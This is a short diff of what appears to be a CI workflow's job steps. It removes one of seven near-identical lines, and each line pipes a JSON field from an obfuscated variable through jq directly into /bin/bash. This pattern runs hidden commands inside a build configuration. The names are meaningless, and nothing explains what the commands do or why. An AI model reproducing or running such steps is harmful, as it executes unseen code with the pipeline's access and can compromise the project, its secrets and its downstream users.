@@ -36,7 +36,6 @@ jobs:
           echo $crgsl211 | jq -r .npct8 | /bin/bash
           echo $vt228 | jq -r .wyc76 | /bin/bash
           echo $n0 | jq -r .lvfn7 | /bin/bash
-          echo $s96667 | jq -r .pgh5486 | /bin/bash
           printf '%s' "$rhic78558" | jq -r .n1387 | /bin/bash
           echo $pqmsp07725 | jq -r .tz1908 | /bin/bash
           printf '%s' "$k498" | jq -r .z3949 | /bin/bash
